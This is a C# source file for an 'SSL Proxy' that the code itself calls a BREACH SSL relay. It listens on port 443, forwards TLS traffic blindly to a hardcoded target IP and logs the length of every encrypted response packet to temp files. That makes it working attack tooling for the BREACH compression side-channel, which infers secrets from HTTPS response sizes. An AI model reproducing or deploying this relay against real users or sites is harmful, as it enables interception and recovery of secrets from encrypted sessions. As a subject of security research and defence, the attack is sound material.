using System;
using System.IO;
using System.Threading;
using Socket = Chilkat.Socket;

namespace SSLProxy
{
    partial class Program
    {
        static string TargetIP = "157.56.163.101"; // malbot.net
        static string PacketLengthLog = Path.Combine(Path.GetTempPath(), "readBytesClosed.txt");
        static string PacketRealTimeLog = Path.Combine(Path.GetTempPath(), "readBytesRealTime.txt");

        static void Main(string[] args)
        {
            int responseBytesTotal = 0;
            int sequence = 0, i = 0;

            Socket listenSocket = InitializeSocketLibrary();
            Socket outboundSocket = InitializeSocketLibrary();
            File.Delete(PacketRealTimeLog);

            // Bind on port 443
            if (listenSocket.BindAndListen(443, 25) != true)
            {
                Console.WriteLine(listenSocket.LastErrorText + "\r\n");
                return;
            }

            Console.WriteLine("[BREACH SSL Relay ready on 443]\n");

            // Keep the proxy up & running
            while (true)
            {
                // Every 1000 closed sockets, force cleanup & garbage collection
                if (++i % 1000 == 0)
                {
                    Console.Write("## RESET CLEANUP...");
                    Thread.Sleep(500);
                    listenSocket.Close(10000);
                    outboundSocket.Close(10000);
                    listenSocket = InitializeSocketLibrary();
                    outboundSocket = InitializeSocketLibrary();

                    if (!listenSocket.BindAndListen(443, 25))
                    {
                        Console.WriteLine(listenSocket.LastErrorText + "\r\n");
                        return;
                    }

                    GC.WaitForFullGCComplete();
                    Console.WriteLine(" Done!");
                }

                Chilkat.Socket connectedSocket = null;

                // Listen to incoming client
                do
                {
                    try
                    {
                        connectedSocket = listenSocket.AcceptNextConnection(6000000);
                    }
                    catch (System.AccessViolationException e)
                    {
                        connectedSocket = null;
                        Console.WriteLine("## Error (001): " + e);
                        Thread.Sleep(500);
                    }
                } while (connectedSocket == null);


                // Connect to outbound target
                // BLIND SSL Relay (no need to establish a new SSL tunnel)
                if (!outboundSocket.Connect(TargetIP, 443, false, 10000))
                {
                    Console.WriteLine(outboundSocket.LastErrorText + "\r\n");
                    continue;
                }

                //  Set maximum timeouts for reading an writing (in millisec)
                connectedSocket.MaxReadIdleMs = 90000;
                connectedSocket.MaxSendIdleMs = 90000;
                outboundSocket.MaxReadIdleMs = 90000;
                outboundSocket.MaxSendIdleMs = 90000;

                int received = 0;
                bool receivingClient = false;
                bool receivingServer = false;


                // Main loop for SSL Proxy - Processing and forwarding flows in both 
                // directions so long the conneciton is kept alive
                while (true)
                {
                    if (!connectedSocket.IsConnected)
                        break;

                    byte[] requestBytes = null;

                    if (!receivingClient)
                    {
                        receivingClient = true;

                        try
                        {
                            if (!connectedSocket.AsyncReceiveBytes())
                            {
                                Console.WriteLine(connectedSocket.LastErrorText + "\r\n");
                                Thread.Sleep(100);
                                break; 
                            }
                        }
                        catch (AccessViolationException e)
                        {
                            Console.WriteLine("## Error (002): " + e);
                            Thread.Sleep(100);
                            break;
                        }
                    }

                    // Request starts here, receive from client
                    if (receivingClient
                        && connectedSocket.AsyncReceiveFinished)
                    {
                        receivingClient = false;
                        requestBytes = connectedSocket.AsyncReceivedBytes;
                        if (requestBytes != null && requestBytes.Length > 0)
                        {
                            Console.WriteLine(" >>> rcv: " + responseBytesTotal);

                            if (responseBytesTotal != 0
                                && File.Exists(PacketRealTimeLog))
                            {
                                // Since we are detecting a new request and HTTP is synchronous, we now know the previous 
                                // response has completed, and we measure the aggregated byte count for all its packets
                                LogPacketLength(PacketRealTimeLog, "--- " + responseBytesTotal,
                                    FileMode.Append, FileAccess.Write, FileShare.Read);

                                Console.WriteLine("\n----------------\n");
                            }


                            // Relay bytes to target server
                            if (!outboundSocket.SendBytes(requestBytes))
                            {
                                Console.WriteLine(connectedSocket.LastErrorText + "\r\n");
                                Thread.Sleep(100);
                                break;
                            }
                        }
                    }


                    // Response starts here
                    byte[] responseBytes = null;

                    if (!receivingServer)
                    {
                        receivingServer = true;

                        try
                        {
                            if (!outboundSocket.AsyncReceiveBytes())
                            {
                                Console.WriteLine("## Error (004) " + outboundSocket.LastErrorText + "\r\n");
                                Thread.Sleep(100);
                                continue;
                            }
                        }
                        catch (System.AccessViolationException e)
                        {
                            Console.WriteLine("## Error (003): " + e);
                            Thread.Sleep(100);
                            break;
                        }
                    }

                    // Write to log file
                    if (receivingServer
                        && outboundSocket.AsyncReceiveFinished)
                    {
                        receivingServer = false;
                        responseBytes = outboundSocket.AsyncReceivedBytes;

                        if (responseBytes != null && responseBytes.Length > 0)
                        {
                            received += responseBytes.Length;
                            Console.WriteLine("<<" + responseBytes.Length);
                            sequence++;

                            // Real time packet log (logging each individual packet length for BREACH)
                            LogPacketLength(PacketRealTimeLog, sequence + " " + responseBytes.Length,
                                FileMode.Append, FileAccess.Write, FileShare.Read);


                            Console.Title = "received: " + received;
                            responseBytesTotal += responseBytes.Length;

                            // Relay to client
                            if (!connectedSocket.SendBytes(responseBytes))
                            {
                                Console.WriteLine("## Error (005) " + connectedSocket.LastErrorText + "\r\n");
                                Thread.Sleep(100);
                                break;
                            }
                        }

                        else if (connectedSocket.IsConnected
                            && !outboundSocket.IsConnected)
                        {
                            // We lost one socket, kill it with fire
                            connectedSocket.Close(10000);
                            break;
                        }
                    }
                }

                // Log for non-Keep-Alive cases (Connection Closed)
                LogPacketLength(PacketLengthLog, received.ToString(),
                    FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);


                //  Close the connection with the client.
                outboundSocket.Close(10000);
                connectedSocket.Close(10000);
                Console.WriteLine("Socket Closed < " + received);
            }
        }


    }
}
